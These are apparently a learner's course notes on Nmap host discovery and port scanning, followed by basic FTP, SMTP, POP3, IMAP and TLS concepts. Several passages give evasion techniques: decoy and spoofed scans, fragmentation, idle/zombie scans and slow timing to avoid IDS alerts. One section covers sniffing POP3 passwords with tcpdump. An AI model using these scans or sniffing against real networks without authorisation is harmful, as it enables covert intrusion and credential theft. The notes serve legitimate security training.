###The scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.###

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests.

#ICMP Timestamp
nmap -PP -sn 10.10.223.163/24

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM.
#ICMP Address Mask
nmap -PM -sn 10.10.223.163/24
-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using TCP and UDP
If you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.

#TCP SYN ping
nmap -PS -sn MACHINE_IP/24 
#Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.


TCP ACK Ping

As you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.

By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.

The following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.

In this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet

-=-=-=-=
UDP Ping

Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

In the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.

The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping.

Masscan
However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:

    masscan MACHINE_IP/24 -p443
    masscan MACHINE_IP/24 -p80,443
    masscan MACHINE_IP/24 -p22-25
    masscan MACHINE_IP/24 ‐‐top-ports 100

Using reverse-dns lookup 
Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.

By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option


SUMMARY
Scan Type 	        Example Command
ARP Scan 	        sudo nmap -PR -sn MACHINE_IP/24
ICMP Echo Scan 	        sudo nmap -PE -sn MACHINE_IP/24
ICMP Timestamp Scan 	sudo nmap -PP -sn MACHINE_IP/24
ICMP Address Mask Scan 	sudo nmap -PM -sn MACHINE_IP/24
TCP SYN Ping Scan 	sudo nmap -PS22,80,443 -sn MACHINE_IP/30
TCP ACK Ping Scan 	sudo nmap -PA22,80,443 -sn MACHINE_IP/30
UDP Ping Scan 	        sudo nmap -PU53,161,162 -sn MACHINE_IP/30

Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.
Option 	Purpose
-n 	no DNS lookup
-R 	reverse-DNS lookup for all hosts
-sn 	host discovery only. Don't scan ports, just probe to see if the host exists
–traceroute: uses an existing probe method to do a full traceroute. Very clever way to map a network even when most stuff is shut down; if you can get a response from, say, ICMP timestamps you can use that to do the traceroute.



    -Pn: no discovery, just assume the host is up.
    -PS: TCP SYN. Tries to open a TCP port; getting back an ACK or RST will both confirm the host is online, so it works whether the port is open or not. Default is port 80, do “-PS99” or whatever to change the port number.
    -PA: TCP ACK. Sends a bogus ACK, expecting a RST back.
    -PU: UDP. Should get an ICMP port unreachable response.
    -PY: SCTP INIT. Similar to -PS, but tries to open an SCTP connection.
    -PE: ICMP echo. Good ol ping
    -PP: ICMP timestamp. One of those tech dead ends that should be removed or disabled (indeed, it’s not present in IPv6). My Linux server seems to respond with the correct time!
    -PM: ICMP address mask. A way to query the subnet mask. Kind of a useful thing really, but Linux doesn’t seem to answer it. Maybe disabled for security?
    -PO: IP protocol ping. Sends unusual IP protocol requests; ICMP, IGMP, and IP-in-IP by default. My Linux datacenter box doesn’t respond to IGMP or IP-in-IP probes.
    -PR: ARP ping. For local ethernets only, bypasses the kernel’s ARP handling and handles ARP itself.  Any ARP reply implies the host exists. Note this is on by default for local networks and short-circuits other types of requests.

Scanning ports with NMAP
Nmap considers the following six states:

    Open: indicates that a service is listening on the specified port.
    Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
    Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
    Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
    Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
    Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.

TCP flags in the TCP header
Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

-=-=-=-
TCP connect scan
We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT. It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.  A closed TCP port responds to a SYN packet with RST/ACK to indicate that it is not open
-sT 

SYN>
<SYN,ACK 
ACK>
RST,ACK>

Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.

It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up
-=-=-=-==-
TCP SYN Scan 
Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option

We can see a TCP connect scan -sT traffic. Any open TCP port will require Nmap to complete the TCP 3-way handshake before closing the connection. In the lower half of the following figure, we see how a SYN scan -sS does not need to complete the TCP 3-way handshake; instead, Nmap sends an RST packet once a SYN/ACK packet is received.

TCP SYN scan is the default scan mode when running Nmap as a privileged user, running as root or using sudo, and it is a very reliable choice

-=-=-=-=-=
UDP Scan 
UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.

The following figure shows that if we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.
-=-=-=-=-
Fine tuning 


You can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:

    port list: -p22,80,443 will scan ports 22, 80 and 443.
    port range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.

You can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.

You can control the scan timing using -T<0-5>. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:

    paranoid (0)
    sneaky (1)
    polite (2)
    normal (3)
    aggressive (4)
    insane (5)

To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.

-=-=-=-=-=-=-=-
NMAP advanced port scans


Let’s start with the following three types of scans:

    Null Scan
    FIN Scan
    Xmas Scan


TCP Null Scan

The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.

However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered
 Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.

-=-=
TCP FIN Scan

The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.

However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.

-=-=-=-
TCP Xmas Scan

The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.

Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.


On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

-=-=-=
TCP Maimon scan
In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.

Most target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports
As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.
This type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy

-=-=-=-=-=-=-=-
This task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.

TCP ACK Scan

Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.

This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.

After setting up the target VM 10.10.255.227 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.



Window Scan

Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.

However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.


Custom Scan

If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using --scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using --scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

Finally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

-=-=-=-=-=-
Spoofing and Decoys 

n some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.

The following figure shows the attacker launching the command nmap -S SPOOFED_IP 10.10.255.227. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.


In brief, scanning with a spoofed IP address is three steps:

    Attacker sends a packet with a spoofed source IP address to the target machine.
    Target machine replies to the spoofed IP address as the destination.
    Attacker captures the replies to figure out open ports.

In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP 10.10.255.227, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.255.227 to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appears to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.

You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME 10.10.255.227 will make the scan of 10.10.255.227 appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.255.227, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.


-=-=-=-=
Fragmented packets

Firewall

A firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.

IDS

An intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall/IDS, you might benefit from dividing the packet into smaller packets.

Fragmented Packets

Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.

To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.


Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.

In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.

With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.

Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.
-=-=-=-=-
Idle/Zombie Scan 
Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.

The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP 10.10.148.44, where ZOMBIE_IP is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

    Trigger the idle host to respond so that you can record the current IP ID on the idle host.
    Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
    Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.

1. The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.

2. In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.

3. In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.

For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.

It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.

Service Detection

Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.

It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.

-=-=-=
OS detection and traceroute 
-O 
The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.

Traceroute

If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

t is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses

Nmap scripting engine (NSE)

You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.
Script Category 	Description
auth 	                Authentication related scripts
broadcast 	        Discover hosts by sending broadcast messages
brute 	                Performs brute-force password auditing against logins

Protocols and servers 

The $ indicates that this is not a root terminal.
FTP
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

    Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
    Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.

The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH

FTPS uses multiple ports and needs a secondary data channel which makes using firewalls more difficult. On the other hand, SFTP uses a single connection between the client and the server and so it is more firewall-friendly

#STMP
Email delivery over the Internet requires the following components:

    Mail Submission Agent (MSA)
    Mail Transfer Agent (MTA)
    Mail Delivery Agent (MDA)
    Mail User Agent (MUA)


These are the following five steps that an email needs to go through to reach the recipient’s inbox:

    A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
    The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
    The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
    A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
    The recipient will collect its email from the MDA using their email client.

If the above steps sound confusing, consider the following analogy:

    You (MUA) want to send postal mail.
    The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
    The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
    The post office (MTA) delivers the mail to the recipient mailbox (MDA).
    The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.

In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:

    Simple Mail Transfer Protocol (SMTP)
    Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)

We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.

SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.

-=-=-=-=
POP3 

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.

First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.


In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.

Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.


-=-=-==
IMAP 
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.

Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST "" "*", before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.


-=-=-==-=-=-=-=-=-=-=-=-=-=-=

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

    Sniffing Attack (Network Packet Capture)
    Man-in-the-Middle (MITM) Attack
    Password Attack (Authentication Attack)
    Vulnerabilities

Attacking protocols and servers
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.

Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alternation, and Destruction (DAD)

-=-=-=
Sniffing attack
We would consider the following
    Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
    Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
    Tshark is a CLI alternative to Wireshark.

Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.

We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A


-=-=-==-
SSL/TLS

The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.

Protocol 	Default Port 	Secured Protocol 	Default Port with TLS
HTTP 	        80 	        HTTPS 	                443
FTP     	21      	FTPS            	990
SMTP     	25      	SMTPS            	465
POP3     	110      	POP3S            	995
IMAP     	143      	IMAPS            	993

Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:

    Establish a TCP connection with the remote web server
    Send HTTP requests to the web server, such as GET and POST requests.

HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:

    Establish a TCP connection
    Establish SSL/TLS connection
    Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server.


After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:

    The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
    The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
